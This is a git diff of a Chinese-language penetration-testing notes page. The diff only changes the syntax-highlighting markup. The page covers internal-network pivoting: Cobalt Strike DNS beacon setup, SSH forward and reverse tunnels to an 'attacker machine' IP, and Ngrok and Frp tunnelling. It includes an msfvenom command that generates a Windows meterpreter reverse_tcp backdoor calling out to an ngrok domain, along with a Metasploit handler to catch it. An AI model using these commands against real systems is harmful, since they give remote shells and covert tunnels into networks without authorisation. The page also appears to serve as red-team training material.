@@ -228,31 +228,31 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <li>利用这种beacon横移必须有目标主机的管理员组的权限或者说是拥有具有管理员组权限的<strong>凭据</strong>。<h3><span id="dns">DNS</span></h3>判断：<code>nslookup</code>、<code>dig</code><br>内网主机只出网DNS协议数据<br>1、添加域名记录<br>A记录：<br>cs.xxx.com —&gt; 81.123.56.78<br>添加NS记录：<br>ns：ns.xxx.com —&gt; cs.xxx.com<br>2、创建监听器<br>在CS创建监听器时选择<code>Beacon DNS</code>。<br>DNS地址写：ns.xxx.com<br>DNS地址(Stager)写：cs.xxx.com<br>3、生成后门绑定监听器，执行上线<br>DNS解析过程：ns.xxx.com —&gt; cs.xxx.com —&gt;  81.123.56.78<br>这样就反向找到了，但是上线后还是黑色的，再执行命令：<code>mode dns-txt</code></li>
 </ul>
 <h3><span id="ssh">SSH</span></h3><p>拿下一台内网的<strong>linux跳板机</strong>时，可以用ssh隧道….还是很鸡肋冷门的。<br>开启ssh协议登录：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config
-PermitRootLogin yes
-PasswordAuthentication yes
-&#x2F;etc&#x2F;init.d&#x2F;ssh start
-&#x2F;etc&#x2F;init.d&#x2F;ssh restart
-#本地 出站封 正向
-#将内网的192.168.1.15主机的8080端口映射到 跳板机192.168.1.166 的1234端口
-ssh -CfNg -L 1122:192.168.1.15:8080 root@192.168.1.166
-curl http:&#x2F;&#x2F;127.0.0.1:1122
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">vi</span> /etc/ssh/sshd_config
+PermitRootLogin <span class="token function">yes</span>
+PasswordAuthentication <span class="token function">yes</span>
+/etc/init.d/ssh start
+/etc/init.d/ssh restart
+<span class="token comment">#本地 出站封 正向</span>
+<span class="token comment">#将内网的192.168.1.15主机的8080端口映射到 跳板机192.168.1.166 的1234端口</span>
+<span class="token function">ssh</span> -CfNg -L <span class="token number">1122</span>:192.168.1.15:8080 root@192.168.1.166
+<span class="token function">curl</span> http://127.0.0.1:1122
 
-#远程 入站封 反向
-#将内网的192.168.1.15主机的8080端口映射到 攻击机81.123.56.78 的1234端口。
-ssh -CfNg -R 1234:192.168.1.15:8080 root@81.123.56.78	#跳板机linux执行
-curl http:&#x2F;&#x2F;127.0.0.1:1234	#攻击机执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">#远程 入站封 反向</span>
+<span class="token comment">#将内网的192.168.1.15主机的8080端口映射到 攻击机81.123.56.78 的1234端口。</span>
+<span class="token function">ssh</span> -CfNg -R <span class="token number">1234</span>:192.168.1.15:8080 root@81.123.56.78	<span class="token comment">#跳板机linux执行</span>
+<span class="token function">curl</span> http://127.0.0.1:1234	<span class="token comment">#攻击机执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2><span id="穿透">穿透</span></h2><p><strong>实现两个内网的通讯</strong>。<br>工具：<br>Ngrok	入门型：<a target="_blank" rel="noopener" href="https://www.ngrok.cc/">https://www.ngrok.cc</a><br>Frp 		简易型：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br>Nps 可以自定义：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a><br>Spp 有特殊协议：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a><br>EW（停更）：<a target="_blank" rel="noopener" href="http://www.rootkiter.com/EarthWorm">http://www.rootkiter.com/EarthWorm</a></p>
 <h3><span id="ngrok">Ngrok</span></h3><p><a target="_blank" rel="noopener" href="https://www.ngrok.cc/">https://www.ngrok.cc</a><br>注册，交2块钱实名，建立免费隧道，协议<code>tcp</code>，隧道名称自己写，本地端口填写kail的<code>IP:端口</code> 。<br>下载客户端，Sunny。kali执行命令：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.&#x2F;sunny clientid 130117399640<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./sunny clientid <span class="token number">130117399640</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>后面的id就是生成的隧道id。<br>生成MSF后门</p>
 <pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;qwq.free.idcfengye.com lport&#x3D;80 -f exe -o ngrok.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole
-use exploit&#x2F;multi&#x2F;handler
-set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
-set lhost 0.0.0.0
-set lport 2222
+use exploit/multi/handler
+<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp
+<span class="token builtin class-name">set</span> lhost <span class="token number">0.0</span>.0.0
+<span class="token builtin class-name">set</span> lport <span class="token number">2222</span>
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3><span id="frp">Frp</span></h3><p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br>frp是一个专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网IP节点的中转暴露到公网。<br>自行搭建，方便修改，成本低，使用多样化，隐私。<br>1、服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）<br>服务器修改配置文件frps.ini：</p>
 <pre class="line-numbers language-none"><code class="language-none">[common]
